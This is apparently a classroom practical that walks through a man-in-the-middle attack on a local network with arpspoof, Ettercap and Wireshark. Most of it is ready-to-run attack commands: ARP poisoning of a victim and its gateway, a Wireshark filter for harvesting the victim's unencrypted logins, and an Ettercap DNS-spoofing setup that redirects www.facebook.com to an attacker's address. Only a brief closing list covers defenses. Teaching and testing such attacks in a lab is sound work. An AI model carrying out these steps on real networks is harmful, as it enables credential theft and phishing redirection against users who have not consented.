Man-in-the-Middle (MITM) Attack- Ettercap & Wireshark
--------------------------------------------------

-----------------------------------------------------
A Man-in-the-Middle (MITM) attack occurs when an attacker intercepts communication between two parties, allowing them to read, modify, or inject malicious data.

Definition: 
A Man-in-the-Middle (MITM) attack is a cyberattack where an attacker secretly intercepts and alters communication between two parties. This allows the attacker to steal data, inject malicious content, or impersonate one of the communicating entities.

Outcomes/Learning:  
After learning about Man-in-the-Middle (MITM) attacks, you will understand how attackers intercept and manipulate network communications. You will also gain knowledge of detection techniques and security measures to prevent such attacks.




________________________________________ Prerequisites:
•	Attacker System: Kali Linux (or any system with ettercap, arpspoof, and Wireshark installed).
•	Victim System: A Windows/Linux/Mac machine connected to the same network.
•	Tools Used:
o	arpspoof (for ARP poisoning)
o	ettercap (for automated MITM attacks)
o	Wireshark (for packet sniffing)
________________________________________
Step 1: Enable Packet Forwarding (So Traffic Can Pass Through the Attacker)
Run the following command to allow Kali Linux to forward network packets:
echo 1 > /proc/sys/net/ipv4/ip_forward

🔹Why? Without this, intercepted packets will not reach the actual destination, causing network disruptions.
________________________________________
Step 2: Scan the Network to Identify Targets
First, find the IP address of your machine and the router/gateway:
ip a | grep inet
or
ifconfig
Next, use nmap to scan the network and identify connected devices:
sudo nmap -sn 192.168.1.1/24
This will list all devices on the network, including their IP addresses and MAC addresses.
________________________________________
Step 3: Perform ARP Spoofing (Impersonate the Router & Victim)
Method 1: Using arpspoof (Command Line)
Run the following two commands in separate terminals:
1 Spoof the victim by making them think the attacker is the router:

sudo arpspoof -i eth0 -t <victim_IP> <gateway_IP>
2 Spoof the router by making it believe the attacker is the victim:
sudo arpspoof -i eth0 -t <gateway_IP> <victim_IP>
Method 2: Using ettercap (Graphical Interface)
1.	Open Ettercap in graphical mode:
sudo ettercap -G
2.	Go to "Sniff" → "Unified Sniffing", select your network interface (eth0 or wlan0).
3.	Scan for hosts: "Hosts" → "Scan for hosts".
4.	Select the victim's IP and router's IP from the host list.
5.	Click "MITM" → "ARP Poisoning", check "Sniff remote connections", and start.
________________________________________
Step 4: Capture Network Traffic (Sniff Data Using Wireshark)
1.	Open Wireshark:
2.	Select the network interface (e.g., eth0 for Ethernet or wlan0 for Wi-Fi).
3.	Apply a filter to capture traffic from the victim:
ip.addr == <victim_IP>
4.	Look for unencrypted HTTP traffic, login credentials, and sensitive data.
________________________________________
Step 5: Inject Malicious Data (Optional - DNS Spoofing/HTTPS Downgrade)
DNS Spoofing Example (Redirect Victim to a Fake Website)
Edit the Ettercap configuration file:
sudo nano /etc/ettercap/etter.dns
Add a fake DNS entry like:
www.facebook.com A 192.168.1.100
Save and run:
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp // //
OR
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp ///

Now, if the victim visits www.facebook.com, they will be redirected to the attacker's IP (192.168.1.100).
________________________________________
Step 6: Stop the Attack and Restore ARP Tables
Once the test is complete, restore the victim’s original ARP table:
sudo arp -d <gateway_IP>
or restart the network interface:
sudo systemctl restart networking
________________________________________
Prevention & Defense Against MITM Attacks
1.	Use HTTPS Everywhere: Encrypted traffic prevents data interception.
2.	Enable ARP Spoofing Protection: Use tools like arpwatch.
3.	Use VPN: Encrypts all traffic, making MITM attacks useless.
4.	Monitor Network Activity: Use Wireshark to detect unusual ARP activity.
5.	Static ARP Entries: Manually set ARP entries for critical devices.
________________________________________
 Conclusion
By following this practical, you learned:
 How attackers intercept network traffic using ARP spoofing.
How to capture sensitive data using Wireshark.
How to defend against MITM attacks.
